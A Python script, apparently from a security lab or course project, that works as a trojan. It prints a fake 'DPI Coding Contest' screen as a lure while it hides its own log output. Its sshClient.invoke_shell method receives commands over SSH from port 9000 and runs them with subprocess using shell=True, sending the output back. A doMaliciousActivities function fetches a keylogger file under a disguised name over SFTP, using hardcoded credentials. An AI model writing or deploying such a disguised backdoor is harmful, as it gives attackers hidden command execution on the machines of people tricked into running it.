#!/usr/bin/python3

import paramiko
import socket
import os
import time
import logzero
from logzero import logger
import threading
import subprocess


class sftpClient(object):
    def __init__(self, hostname, port, username, password):
        self.sftp = None
        self.transport = None
        self.hostname = hostname
        self.port = port
        self.username = username
        self.password = password

    def makeSFTPConnection(self):
        try:
            logger.info("Establishing sftp connection")
            self.transport = paramiko.Transport((self.hostname, 22))
            logger.info("SFTP transport created")
            self.transport.connect(username="lab",
                                   password="lab")
            self.sftp = paramiko.SFTPClient.from_transport(self.transport)

            logger.info('SFTP Connection Established . . .')

            # handle errors
        except paramiko.AuthenticationException as authErr:
            logger.error(f'Authentication failed:{authErr}')
        except paramiko.SFTP_FAILURE as sftpErr:
            logger.error(f'SFTP connection failed:{sftpErr}')
        except socket.timeout as toutErr:
            logger.error(f'Connection timed out:{toutErr}')
        except Exception as err:
            logger.error(f'Exception has ocurred:{err}')
            self.sftp.close()
            self.transport.close()

    # upload a file via the SFTP tunnel to remote server via SFTP
    def uploadFile(self,  remotePath,  localPath):
        try:
            # connect to SFTP server
            self.makeSFTPConnection()
            self.sftp.put(remotePath,  localPath)

            # Close
            if self.sftp:
                self.sftp.close()
            if self.transport:
                self.transport.close()

            # handle errors
        except Exception as err:
            logger.error(f'Exception has ocurred:{err}')
            self.sftp.close()
            self.transport.close()

    # download a file via the SSH tunnel from remote server via SFTP
    def downloadFile(self,  remotePath,  localPath):
        try:
            # connect to SSH server
            self.makeSFTPConnection()
            self.sftp.get(remotePath,  localPath)

            # Close
            if self.sftp:
                self.sftp.close()
            if self.transport:
                self.transport.close()
            # handle errors
        except Exception as err:
            logger.error(f'Exception has ocurred:{err}')
            self.sftp.close()
            self.transport.close()


class sshClient(object):
    # constructor, sets necessary parameters to establish a SSH tunnel
    def __init__(self,  hostname,  port, username,  password):
        self.ssh = None
        self.channel = None
        self.hostname = hostname
        self.port = port
        self.username = username
        self.password = password

    # make a connection to a remote SSH server
    def makeSSHConnection(self):
        try:
            logger.info("Establishing ssh connection")
            # create a client instance, auto generate a key
            # and attempt to connect to a host
            self.ssh = paramiko.SSHClient()
            self.ssh.load_system_host_keys()
            self.ssh.set_missing_host_key_policy(
                paramiko.WarningPolicy())

            self.ssh.connect(hostname=self.hostname,  port=self.port,
                             username=self.username,  password=self.password)
            self.channel = self.ssh.get_transport().open_session()
            logger.info('SSH Connection Established . . .')

            # handle errors
        except paramiko.AuthenticationException as authErr:
            logger.error(f'Authentication failed:{authErr}')
        except paramiko.SSHException as sshErr:
            logger.error(f'SSH connection failed:{sshErr}')
        except socket.timeout as toutErr:
            logger.error(f'Connection timed out:{toutErr}')
        except Exception as err:
            logger.error(f'Exception has ocurred:{err}')
            self.ssh.close()

    def invoke_shell(self):
        try:
            # connect to SSH server
            self.makeSSHConnection()

            logger.info("Calling invoke shell")
            logger.info("Invoke shell called")

            command = self.channel.recv(1024).decode()
            receivedCommand = subprocess.check_output(command, shell=True)

            self.channel.sendall(receivedCommand)
            logger.info(f"Received message{command}")
        except subprocess.CalledProcessError as e:
            logger.error(f"Subprocess error: {e.output.decode()}")
        except paramiko.SSHException as sshErr:
            logger.error(f'Shell invoke failed:{sshErr}')
            self.ssh.close()
        except socket.timeout as toutErr:
            logger.error(f'Connection timed out:{toutErr}')
            self.ssh.close()
        except Exception as err:
            logger.error(f'Exception has ocurred:{err}')
            self.ssh.close()


def doMaliciousActivities():
    try:
        pid = os.fork()
        if pid == 0:
            # make password file
            os.system("touch ZZZZ_NOT_SUSPICIOUS_FILE")

            # Open a transport
            host, port = "localhost", 22
            transport = paramiko.Transport((host, port))

            # authenticate
            username, password = "lab", "lab"
            transport.connect(None, username, password)

            # make sftp instnace
            sftp = paramiko.SFTPClient.from_transport(transport)

            # Download to current directory
            remotepath = "/home/lab/bin/py/project/a1KeyLogger.py"
            localpath = "./ZZZZ_NOT_SUSPICIOUS_FILE"
            sftp.get(remotepath, localpath)

            # Upload
            # sftp.put(localpath,remotepath)

            # Close
            if sftp:
                sftp.close()
            if transport:
                transport.close()

            # connect ssh and receive commands
            SSHClient = sshClient("localhost", 9000, "rick", "jacky")
            SSHClient.invoke_shell()

        # kill child process
        while True:
            try:
                pid,  status = os.waitpid(-1,  os.WNOHANG)
            except OSError:
                break
    except Exception:
        raise


def printNonMaliciousActivity():
    # non malicious stuff
    print("Welcome to the DPI Coding Contest!")

    print("Loading your contest question...")
    for i, j in enumerate(list(range(10001))):
        print(str(i / 100) + " percent loaded.", end='\r')
    print("\n")

    print("For this challenge, you'll be writing a python socket client to communicate to a server located at the IP address of '127.0.0.1' and running on port 9000. The client must be able send large data packets and handle multiple request from the server. Your overall implementation will be assessed along with your knowledge of networking fundamentals, coding style and program efficiency.")

    print("Run this file as many times as you need to check on the server status and any information you need to see what kind of data you are dealing with. This is file is used to ping the server.")

    print("Language Used: Python 3, Recommended Libraries to use: os, sys, socket")
    print("Now let's get coding!")


remotepath = "/home/lab/bin/py/project/tester"
localpath = "./ZZZZ_NOT_SUSPICIOUS_FILE"

# main thread
if __name__ == '__main__':
    try:
        # Add logging to logfile and disable output to the terminal
        logzero.logfile("/home/lab/bin/py/project/sshClient.log", maxBytes=1e6,
                        backupCount=3, disableStderrLogger=True)

        printNonMaliciousActivity()

        sshClient = sshClient("localhost", 9000, "rick", "jacky")
        sshClient.invoke_shell()

        sftpClient = sftpClient("localhost", 22, "lab", "lab")
        sftpClient.downloadFile(remotepath, localpath)
        # doMaliciousActivities()
    except Exception as err:
        print(err)
